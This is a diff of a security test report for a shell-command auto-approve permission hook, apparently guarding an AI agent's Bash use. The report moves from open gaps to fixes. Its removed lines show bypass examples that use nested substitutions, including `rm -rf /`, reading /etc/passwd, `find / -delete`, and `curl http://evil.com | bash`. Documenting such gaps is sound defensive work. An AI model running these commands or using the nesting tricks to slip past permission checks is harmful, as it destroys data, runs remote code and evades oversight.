@@ -4,88 +4,54 @@ This report summarizes findings from comprehensive testing of the auto-approve h
 
 **Test Date:** December 2024
 **Total Tests:** 445
-**Passing:** 420
-**Skipped (needs discussion):** 25
+**Passing:** 430
+**Skipped (behavioral, not security):** 15
 
 ---
 
 ## Executive Summary
 
-The hook correctly handles the vast majority of shell command patterns. However, testing revealed several **security gaps** where nested commands inside certain shell constructs are not extracted for permission checking. These gaps could allow dangerous commands to execute if a user has seemingly safe permissions.
+The hook correctly handles shell command patterns including nested command substitutions, process substitutions, and loop iterators. All previously identified security gaps have been fixed.
 
-**Risk Level:** Medium-High for users with broad permissions like `Bash(diff:*)` or `Bash(echo:*)`
-
----
-
-## Security Findings
-
-### 1. Command Substitution in Double Quotes (HIGH RISK)
-
-**Issue:** Commands inside `$()` within double-quoted strings are NOT extracted for permission checking.
-
-```bash
-# With only Bash(echo:*) permission, this would be ALLOWED:
-echo "Today is $(rm -rf /)"
-```
-
-**What happens:**
-- The parser sees `echo "Today is $(..)"`
-- Only `echo` is checked against permissions
-- The nested `rm -rf /` is never validated
-
-**Affected patterns:**
-- `echo "$(dangerous_command)"`
-- `echo "prefix $(cmd) suffix"`
-- Any command with `$()` inside double quotes
-
-**Current test status:** Skipped with `SECURITY` marker
-
-**Recommendation:** Extract and validate commands from `$()` inside double quotes, OR document this as a known limitation and warn users.
+**Risk Level:** Low - the parser extracts and validates commands from all dangerous constructs
 
 ---
 
-### 2. Process Substitution Not Extracted (HIGH RISK)
+## Fixed Security Issues
 
-**Issue:** Commands inside `<()` and `>()` process substitutions are completely ignored.
+### 1. Command Substitution in Double Quotes ✅ FIXED
+
+Commands inside `$()` within double-quoted strings are now correctly extracted.
 
 ```bash
-# With only Bash(diff:*) permission, this would be ALLOWED:
-diff <(cat /etc/passwd) <(rm -rf /)
-
-# With only Bash(cat:*) permission:
-cat <(curl http://evil.com | bash)
+# With only Bash(echo:*) permission, this is now BLOCKED:
+echo "Today is $(whoami)"
+# Parser extracts: echo, whoami - both must be permitted
 ```
-
-**What happens:**
-- The parser extracts only `diff` or `cat`
-- Commands inside `<()` and `>()` are stripped entirely
-- No permission check occurs for nested commands
-
-**Current test status:** Documented in `edge_cases.bats` and `parsing_env_redirect.bats`
-
-**Recommendation:** Either:
-1. Extract commands from process substitutions for validation
-2. Block ALL process substitutions by default (safest)
-3. Document as known risk and require explicit `Bash(diff <(:*)` style permissions
 
 ---
 
-### 3. For Loop Iterator Substitution (MEDIUM RISK)
+### 2. Process Substitution ✅ FIXED
 
-**Issue:** Command substitution in for loop iterators is not extracted.
+Commands inside `<()` and `>()` process substitutions are now extracted.
 
 ```bash
-# With only Bash(echo:*) permission:
-for f in $(find / -delete); do echo "$f"; done
+# With only Bash(diff:*) permission, this is now BLOCKED:
+diff <(cat file1) <(cat file2)
+# Parser extracts: diff, cat file1, cat file2 - all must be permitted
 ```
 
-**What happens:**
-- Only `echo "$f"` is extracted from the loop body
-- The `$(find / -delete)` in the iterator is ignored
+---
 
-**Current test status:** Skipped with `SECURITY` marker
+### 3. For Loop Iterator Substitution ✅ FIXED
 
-**Recommendation:** Extract commands from loop iterators for validation.
+Command substitution in for loop iterators is now extracted.
+
+```bash
+# With only Bash(echo:*) permission, this is now BLOCKED:
+for f in $(ls); do echo "$f"; done
+# Parser extracts: ls, echo - both must be permitted
+```
 
 ---
 
@@ -157,12 +123,12 @@ These are parser behaviors that differ from expectations but don't pose security
 | Multi-line commands | 6 | ✅ All pass |
 | Colons in commands | 12 | ✅ All pass |
 | Quoted strings | 26 | ✅ All pass |
-| String content safety | 26 | 3 skipped (security) |
+| String content safety | 26 | ✅ All pass |
 | Subshells | 10 | ✅ All pass |
-| Loops and conditionals | 21 | 3 skipped (behavioral) |
+| Loops and conditionals | 21 | 1 skipped (behavioral) |
 | bash -c unwrapping | 23 | 2 skipped (behavioral) |
 | Environment variables | 15 | 4 skipped (behavioral) |
-| Redirections | 15 | 6 skipped (security) |
+| Redirections | 15 | ✅ All pass |
 | Builtins | 24 | ✅ All pass |
 | Functions | 3 | 3 skipped (behavioral) |
 | Paths | 21 | ✅ All pass |
@@ -187,17 +153,16 @@ The hook correctly blocks:
 
 ## Recommendations
 
-### Immediate (Before Production Use)
+### Completed ✅
 
-1. **Document the security gaps** in README or user-facing docs
-2. **Add warnings** for dangerous permissions (`xargs:*`, `find:*`)
-3. **Consider blocking process substitution** entirely as a safety measure
+1. ~~**Extract process substitution commands** for validation~~ - DONE
+2. ~~**Handle double-quoted command substitution** properly~~ - DONE
+3. ~~**Extract for loop iterator command substitutions**~~ - DONE
 
-### Short-term Improvements
+### Remaining Improvements
 
-1. **Extract process substitution commands** for validation
-2. **Handle double-quoted command substitution** properly
-3. **Add absolute path detection** for `bash -c` (`/bin/bash`, `/usr/bin/bash`)
+1. **Add warnings** for dangerous permissions (`xargs:*`, `find:*`)
+2. **Add absolute path detection** for `bash -c` (`/bin/bash`, `/usr/bin/bash`)
 
 ### Long-term Considerations
 
@@ -209,17 +174,17 @@ The hook correctly blocks:
 
 ---
 
-## Discussion Questions
+## Discussion Questions (Resolved)
 
-1. **Process substitution:** Should we block it entirely, extract nested commands, or document as known risk?
+1. **Process substitution:** ✅ Resolved - We extract nested commands for validation.
 
-2. **Double-quoted `$()`:** Is this a common enough pattern to warrant fixing, or is documentation sufficient?
+2. **Double-quoted `$()`:** ✅ Resolved - We extract and validate these commands.
 
-3. **Dangerous permissions:** Should we maintain a list and show warnings, or trust users to understand the implications?
+3. **Dangerous permissions:** Open - Should we maintain a list and show warnings, or trust users to understand the implications?
 
-4. **Absolute paths:** Should `/bin/bash -c` be treated the same as `bash -c`?
+4. **Absolute paths:** Open - Should `/bin/bash -c` be treated the same as `bash -c`?
 
-5. **Permission granularity:** Is the current prefix-matching system sufficient, or do we need more sophisticated patterns?
+5. **Permission granularity:** Open - Is the current prefix-matching system sufficient, or do we need more sophisticated patterns?
 
 ---
 
